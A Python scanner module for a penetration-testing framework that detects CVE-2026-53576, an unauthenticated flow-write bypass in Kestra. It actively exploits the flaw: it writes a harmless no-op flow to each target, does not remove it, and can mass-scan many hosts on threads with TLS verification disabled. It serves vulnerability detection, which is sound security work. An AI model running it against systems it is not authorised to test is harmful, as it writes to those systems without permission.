import ssl
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

FLOW_PATH = "/api/v1/main/flows/configs"

@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""

class KestraCve202653576Scanner(Auxiliary):
    NAME = "Kestra /configs auth bypass RCE Detection (CVE-2026-53576)"
    DESCRIPTION = (
        "Detects the /configs namespace auth-bypass in Kestra <= 1.3.20. "
        "Attempts to create a harmless flow (that does not execute) in "
        "the configs namespace. 200/409 confirms unauth flow-write."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    SEVERITY = "critical"
    DISCLOSED = "2026-06-03"
    CHECK = True
    REFERENCES = [
        "CVE-2026-53576",
        "https://nvd.nist.gov/vuln/detail/CVE-2026-53576",
    ]
    OPTIONS = [
        Option("RHOSTS", required=True, description="target(s)"),
        Option("RPORT", default=8080, type=int, description="Kestra HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("TIMEOUT", default=10.0, type=float, description="per-request timeout"),
        Option("THREADS", default=20, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool, description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts: raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _probe(self, host):
        ctx = ssl._create_unverified_context()
        try:
            req = urllib.request.Request(self._base(host) + "/")
            req.add_header("User-Agent", "Mozilla/5.0 (metis)")
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                body = r.read(64 * 1024).decode(errors="replace")
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", type(e).__name__)
        if "kestra" not in body.lower():
            return HostResult(host, "safe", "not Kestra")
        yaml = (
            "id: metis_probe\n"
            "namespace: configs\n"
            "tasks:\n"
            "  - id: noop\n"
            "    type: io.kestra.plugin.core.debug.Return\n"
            "    format: ok\n"
        )
        req = urllib.request.Request(self._base(host) + FLOW_PATH,
                                     data=yaml.encode(), method="POST")
        req.add_header("Content-Type", "application/x-yaml")
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                status = r.status
        except urllib.error.HTTPError as e:
            status = e.code
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", type(e).__name__)
        if status == 200:
            return HostResult(host, "vulnerable", "flow written in configs namespace")
        if status == 409:
            return HostResult(host, "vulnerable", "flow already present in configs")
        if status == 401:
            return HostResult(host, "safe", "auth required")
        return HostResult(host, "safe", "HTTP " + str(status))

    def _record(self, h):
        svc = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(h.host, self.options["RPORT"], proto="tcp",
                            state="open", name=svc, banner="Kestra")
        self.report_vuln(name=self.NAME, address=h.host, severity="critical",
                         refs="CVE-2026-53576", info=h.detail)

    def check(self):
        host = self._expand_targets()[0]
        print(colors.info("check: probing " + self._base(host)))
        r = self._probe(host)
        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"]); stop_first = self.options["STOP_ON_FIRST"]
        print(colors.info("scanning " + str(len(targets)) + " host(s)"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits, clean, unknown, aborted = [], 0, 0, False
        db = self._db(); ws = bool(db and db.current_workspace_id())
        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try: r = fut.result()
                    except Exception: unknown += 1; continue
                    if r.state == "vulnerable":
                        hits.append(r); bar.log(colors.vuln(r.host + " - " + r.detail))
                        if ws: self._record(r)
                        if stop_first:
                            aborted = True
                            for f in futures: f.cancel()
                            break
                    elif r.state == "safe": clean += 1
                    else: unknown += 1
        finally:
            bar.done()
        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted: print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        return hits
